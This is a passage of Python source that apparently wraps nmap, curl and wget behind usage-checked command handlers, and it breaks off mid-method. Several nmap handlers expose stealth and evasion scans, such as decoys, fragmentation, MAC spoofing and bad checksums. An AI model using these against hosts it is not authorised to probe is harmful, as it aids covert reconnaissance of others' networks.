    def _nmap_comprehensive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_comprehensive <target>'}
        result = NmapCommands.comprehensive(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ping <target>'}
        result = NmapCommands.ping_scan(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ports(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_ports <target> <ports>'}
        result = NmapCommands.ports(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_script(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_script <target> <script>'}
        result = NmapCommands.script(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_output <target> <file>'}
        result = NmapCommands.output(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_exclude(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_exclude <target> <hosts>'}
        result = NmapCommands.exclude(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_input(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_input <file>'}
        result = NmapCommands.input_file(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_random(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_random <count>'}
        result = NmapCommands.random_targets(int(args[0]))
        return {'success': result.success, 'output': result.output}
    
    def _nmap_timing(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_timing <target> <level>'}
        result = NmapCommands.timing(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _nmap_traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_traceroute <target>'}
        result = NmapCommands.traceroute(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_version(self, args: List[str]) -> Dict:
        result = NmapCommands.version()
        return {'success': result.success, 'output': result.output}
    
    def _nmap_help(self, args: List[str]) -> Dict:
        result = NmapCommands.help()
        return {'success': result.success, 'output': result.output}
    
    def _nmap_syn(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_syn <target>'}
        result = NmapCommands.syn_scan(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_connect(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_connect <target>'}
        result = NmapCommands.connect_scan(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ack(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ack <target>'}
        result = NmapCommands.ack_scan(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_fin(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fin <target>'}
        result = NmapCommands.fin_scan(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_xmas(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_xmas <target>'}
        result = NmapCommands.xmas_scan(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_null(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_null <target>'}
        result = NmapCommands.null_scan(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_script_default(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_script_default <target>'}
        result = NmapCommands.default_scripts(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_top_ports(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_top_ports <target> <count>'}
        result = NmapCommands.top_ports(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _nmap_open(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_open <target>'}
        result = NmapCommands.open_only(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_reason(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_reason <target>'}
        result = NmapCommands.reason(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_packet_trace(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_packet_trace <target>'}
        result = NmapCommands.packet_trace(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_iflist(self, args: List[str]) -> Dict:
        result = NmapCommands.iflist()
        return {'success': result.success, 'output': result.output}
    
    def _nmap_no_ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_no_ping <target>'}
        result = NmapCommands.no_ping(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_fast(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fast <target>'}
        result = NmapCommands.fast_scan(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_fragment(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fragment <target>'}
        result = NmapCommands.fragment(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_decoys(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_decoys <target> <count>'}
        result = NmapCommands.decoys(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _nmap_source_port(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_source_port <target> <port>'}
        result = NmapCommands.source_port(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _nmap_data_length(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_data_length <target> <length>'}
        result = NmapCommands.data_length(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ttl(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_ttl <target> <ttl>'}
        result = NmapCommands.ttl(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _nmap_spoof_mac(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_spoof_mac <target> <mac>'}
        result = NmapCommands.spoof_mac(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_badsum(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_badsum <target>'}
        result = NmapCommands.badsum(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_send_eth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_send_eth <target>'}
        result = NmapCommands.send_eth(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_send_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_send_ip <target>'}
        result = NmapCommands.send_ip(args[0])
        return {'success': result.success, 'output': result.output}
    
    # Curl commands
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        result = CurlCommands.basic(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        result = CurlCommands.get(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        result = CurlCommands.post(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_put(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_put <url> <data>'}
        result = CurlCommands.put(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_delete(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_delete <url>'}
        result = CurlCommands.delete(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_patch(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_patch <url> <data>'}
        result = CurlCommands.patch(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_head(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        result = CurlCommands.head(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_options(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_options <url>'}
        result = CurlCommands.options(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_output <url> <file>'}
        result = CurlCommands.output(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_remote_name(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_remote_name <url>'}
        result = CurlCommands.remote_name(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_location <url>'}
        result = CurlCommands.location(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_include(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_include <url>'}
        result = CurlCommands.include(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_verbose <url>'}
        result = CurlCommands.verbose(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_silent(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_silent <url>'}
        result = CurlCommands.silent(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_show_error(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_show_error <url>'}
        result = CurlCommands.show_error(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_fail(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_fail <url>'}
        result = CurlCommands.fail(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_insecure(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_insecure <url>'}
        result = CurlCommands.insecure(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_data(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data <url> <data>'}
        result = CurlCommands.data(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_data_binary(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_binary <url> <file>'}
        result = CurlCommands.data_binary(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_data_urlencode(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_urlencode <url> <data>'}
        result = CurlCommands.data_urlencode(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_form(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_form <url> <field> <value>'}
        result = CurlCommands.form(args[0], args[1], args[2])
        return {'success': result.success, 'output': result.output}
    
    def _curl_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_header <url> <header>'}
        result = CurlCommands.header(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_user_agent(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_user_agent <url> <ua>'}
        result = CurlCommands.user_agent(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_referer(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_referer <url> <referer>'}
        result = CurlCommands.referer(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_user(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_user <url> <user:pass>'}
        result = CurlCommands.user(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_cookie(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookie <url> <cookie>'}
        result = CurlCommands.cookie(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_cookie_jar(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookie_jar <url> <file>'}
        result = CurlCommands.cookie_jar(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_proxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy <url> <proxy>'}
        result = CurlCommands.proxy(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_cert(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cert <url> <cert>'}
        result = CurlCommands.cert(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_key(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_key <url> <key>'}
        result = CurlCommands.key(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_cacert(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cacert <url> <ca>'}
        result = CurlCommands.cacert(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_tlsv1_2(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_tlsv1_2 <url>'}
        result = CurlCommands.tlsv1_2(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_tlsv1_3(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_tlsv1_3 <url>'}
        result = CurlCommands.tlsv1_3(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_continue(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_continue <url>'}
        result = CurlCommands.continue_at(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_range(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_range <url> <range>'}
        result = CurlCommands.range(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_limit_rate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_limit_rate <url> <rate>'}
        result = CurlCommands.limit_rate(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_max_time(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_max_time <url> <seconds>'}
        result = CurlCommands.max_time(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _curl_connect_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_connect_timeout <url> <seconds>'}
        result = CurlCommands.connect_timeout(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _curl_retry(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_retry <url> <count>'}
        result = CurlCommands.retry(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _curl_ipv4(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ipv4 <url>'}
        result = CurlCommands.ipv4(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_ipv6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ipv6 <url>'}
        result = CurlCommands.ipv6(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_interface(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_interface <url> <interface>'}
        result = CurlCommands.interface(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_http2(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_http2 <url>'}
        result = CurlCommands.http2(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_compressed(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_compressed <url>'}
        result = CurlCommands.compressed(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_write_out(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_write_out <url> <format>'}
        result = CurlCommands.write_out(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_dump_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_dump_header <url> <file>'}
        result = CurlCommands.dump_header(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_trace(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_trace <url> <file>'}
        result = CurlCommands.trace(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_json(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_json <url> <json>'}
        result = CurlCommands.json(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_help(self, args: List[str]) -> Dict:
        result = CurlCommands.help()
        return {'success': result.success, 'output': result.output}
    
    def _curl_version(self, args: List[str]) -> Dict:
        result = CurlCommands.version()
        return {'success': result.success, 'output': result.output}
    
    def _curl_parallel(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_parallel <url1> <url2>'}
        result = CurlCommands.parallel(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_config(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_config <file>'}
        result = CurlCommands.config(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_next(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_next <url1> <url2>'}
        result = CurlCommands.next(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _curl_styled(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_styled <url>'}
        result = CurlCommands.styled_output(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_progress(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_progress <url>'}
        result = CurlCommands.progress_bar(args[0])
        return {'success': result.success, 'output': result.output}
    
    # Wget commands
    def _wget(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget <url> [output]'}
        url = args[0]
        output = args[1] if len(args) > 1 else None
        result = WgetCommands.basic(url)
        return {'success': result.success, 'output': result.output}
    
    def _wget_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_output <url> <file>'}
        result = WgetCommands.output(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_continue(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_continue <url>'}
        result = WgetCommands.continue_download(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_background(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_background <url>'}
        result = WgetCommands.background(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_quiet(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_quiet <url>'}
        result = WgetCommands.quiet(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_recursive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_recursive <url>'}
        result = WgetCommands.recursive(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_mirror(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_mirror <url>'}
        result = WgetCommands.mirror(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_spider(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_spider <url>'}
        result = WgetCommands.spider(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_input(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_input <file>'}
        result = WgetCommands.input_file(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_header <url> <header>'}
        result = WgetCommands.header(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_user_agent(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user_agent <url> <ua>'}
        result = WgetCommands.user_agent(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_referer(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_referer <url> <referer>'}
        result = WgetCommands.referer(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_cookies <url> <file>'}
        result = WgetCommands.cookies(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_save_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_save_cookies <url> <file>'}
        result = WgetCommands.save_cookies(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_limit_rate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_limit_rate <url> <rate>'}
        result = WgetCommands.limit_rate(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_timeout <url> <seconds>'}
        result = WgetCommands.timeout(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _wget_tries(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_tries <url> <count>'}
        result = WgetCommands.tries(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _wget_retry(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_retry <url>'}
        result = WgetCommands.retry_connrefused(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_no_check_cert(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_check_cert <url>'}
        result = WgetCommands.no_check_cert(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_certificate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_certificate <url> <cert>'}
        result = WgetCommands.certificate(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_private_key(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_private_key <url> <key>'}
        result = WgetCommands.private_key(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_ca_certificate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_ca_certificate <url> <ca>'}
        result = WgetCommands.ca_certificate(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_proxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_proxy <url> <proxy>'}
        result = WgetCommands.proxy(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_no_proxy(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_proxy <url>'}
        result = WgetCommands.no_proxy(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_user(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user <url> <user>'}
        result = WgetCommands.user(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_password(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_password <url> <pass>'}
        result = WgetCommands.password(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_post_data(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_post_data <url> <data>'}
        result = WgetCommands.post_data(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_post_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_post_file <url> <file>'}
        result = WgetCommands.post_file(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_method(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_method <url> <method>'}
        result = WgetCommands.method(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_timestamping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_timestamping <url>'}
        result = WgetCommands.timestamping(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_no_clobber(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_clobber <url>'}
        result = WgetCommands.no_clobber(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_delete_after(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_delete_after <url>'}
        result = WgetCommands.delete_after(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_progress(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_progress <url>'}
        result = WgetCommands.progress(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_show_progress(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_show_progress <url>'}
        result = WgetCommands.show_progress(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_config(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_config <file>'}
        result = WgetCommands.config(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_append_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_append_output <url> <file>'}
        result = WgetCommands.append_output(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_output_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_output_file <url> <file>'}
        result = WgetCommands.output_file(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_no_parent(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_parent <url>'}
        result = WgetCommands.no_parent(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_cut_dirs(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_cut_dirs <url> <count>'}
        result = WgetCommands.cut_dirs(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _wget_directory_prefix(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_directory_prefix <url> <dir>'}
        result = WgetCommands.directory_prefix(args[0], args[1])
        return {'success': result.success, 'output': result.output}
    
    def _wget_convert_links(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_convert_links <url>'}
        result = WgetCommands.convert_links(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_backup_converted(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_backup_converted <url>'}
        result = WgetCommands.backup_converted(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_adjust_extension(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_adjust_extension <url>'}
        result = WgetCommands.adjust_extension(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_restrict_file_names(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_restrict_file_names <url>'}
        result = WgetCommands.restrict_file_names(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_trust_server_names(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_trust_server_names <url>'}
        result = WgetCommands.trust_server_names(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_content_disposition(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_content_disposition <url>'}
        result = WgetCommands.content_disposition(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_random_wait(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_random_wait <url>'}
        result = WgetCommands.random_wait(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_wait(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_wait <url> <seconds>'}
        result = WgetCommands.wait(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _wget_waitretry(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_waitretry <url> <seconds>'}
        result = WgetCommands.waitretry(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _wget_quota(self, args: List[str]) -> Dict:
        if len(args) < 2:
